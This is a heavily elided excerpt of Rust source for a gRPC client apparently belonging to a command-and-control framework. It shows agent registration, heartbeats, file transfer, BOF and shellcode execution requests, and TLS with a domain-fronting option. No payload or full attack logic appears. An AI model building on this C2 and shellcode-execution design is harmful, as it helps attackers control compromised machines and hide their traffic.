...
use crate::proto::{
    nexus_c2_client, BofRequest, BofResponse, FileChunk, FileDownloadRequest, FileUploadResponse,
    HeartbeatRequest, HeartbeatResponse, RegistrationRequest, RegistrationResponse,
    ShellcodeRequest, ShellcodeResponse, Task, TaskRequest, TaskResult, TaskResultResponse,
};
...
impl GrpcClient {
    ...
    pub async fn connect(&self) -> InfraResult<()> {
        ...
        *self.connection_status.write().await = ConnectionStatus::Connecting;
        ...
        let tls_connector = self
            .cert_manager
            .create_tls_connector(!self.config.domain_fronting)?;
    ...
    pub async fn register_agent(
    ...
    ) -> InfraResult<RegistrationResponse> {
        ...
        if registration_response.success {
            info!(
                ...
                registration_response.agent_id
            );
        } else {
            warn!(
    ...
    pub async fn execute_shellcode(
        &self,
        request: ShellcodeRequest,
    ) -> InfraResult<ShellcodeResponse> {
        info!(
            "Executing shellcode via gRPC for agent: {}",
            request.agent_id
        );
    ...
    ) -> InfraResult<FileUploadResponse> {
        ...
        match client_guard.as_ref() {
            ...
            None => {
                ...
                client_guard
                    .as_ref()
                    .ok_or_else(|| {
                        InfraError::GrpcError("Failed to establish connection".to_string())
                    })
                    .map(|c| c.clone())
            }
        }
        ...
        match self.heartbeat(test_request).await {
            ...
            Err(_) => {
                ...
                *self.connection_status.write().await =
                    ConnectionStatus::Failed("Health check failed".to_string());
                Ok(false)
            }
        }
    }
...
mod tests {
    use super::*;
    use crate::{CloudflareConfig, CloudflareManager, DomainConfig, OriginCertConfig};
    use std::sync::Arc;
    ...
    async fn test_grpc_client_creation() {
        ...
        let domain_manager = Arc::new(
            crate::DomainManager::new(domain_config, cf_manager)
                .await
                .unwrap(),
        );
